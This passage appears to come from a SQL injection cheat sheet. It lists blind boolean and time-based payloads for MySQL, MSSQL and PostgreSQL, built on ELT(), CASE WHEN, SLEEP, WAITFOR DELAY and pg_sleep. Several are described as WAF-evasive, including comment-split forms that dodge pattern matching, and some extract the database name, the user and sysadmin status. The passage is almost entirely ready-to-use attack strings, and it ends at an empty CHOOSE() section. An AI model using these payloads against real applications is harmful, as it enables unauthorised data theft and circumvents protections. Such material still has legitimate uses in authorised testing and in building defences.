...
*ELT() — WAF-evasive boolean/time-based (MySQL):*
```sql
-- Boolean blind via value substitution (not appending)
ELT(5996=5996,'')          -- true  → returns ''
ELT(5997=5996,'')          -- false → returns NULL
' AND ELT(1,1)--           -- true
' AND ELT(2,1)--           -- false (NULL)

-- Time-based via ELT wrapping SLEEP
' AND ELT(1,SLEEP(5))--
' OR ELT(1,SLEEP(5))--
'+(SELECT ELT(1,SLEEP(5)))+'

-- Chained with IF
' AND IF(ELT(1,1),SLEEP(5),0)--
```

*CASE WHEN — most WAF-evasive time-based technique:*
```sql
-- MySQL
' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--
' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--
' AND CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END--   -- no delay (false)

-- MSSQL
'; CASE WHEN (1=1) THEN WAITFOR DELAY '0:0:5' ELSE 0 END--
'; IF (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Comment-split variant (hardest for WAF to pattern-match)
'CASE/**/WHEN/**/(1=1)/**/THEN/**/SLEEP(5)/**/ELSE/**/0/**/END--
';CASE/**/WHEN/**/(1=1)/**/THEN/**/WAITFOR/**/DELAY/**/'0:0:5'/**/ELSE/**/0/**/END--

-- Data extraction via CASE WHEN (MSSQL)
'; CASE WHEN (SUBSTRING(db_name(),1,1)='m') THEN WAITFOR DELAY '0:0:5' ELSE 0 END--
'; CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN WAITFOR DELAY '0:0:5' ELSE 0 END--

-- Data extraction via CASE WHEN (MySQL)
' AND CASE WHEN (SUBSTRING(database(),1,3)='pvi') THEN SLEEP(5) ELSE 0 END--
' AND CASE WHEN (SUBSTRING(user(),1,4)='root') THEN SLEEP(5) ELSE 0 END--
```

*MSSQL CHOOSE() — equivalent of MySQL ELT():*
```sql
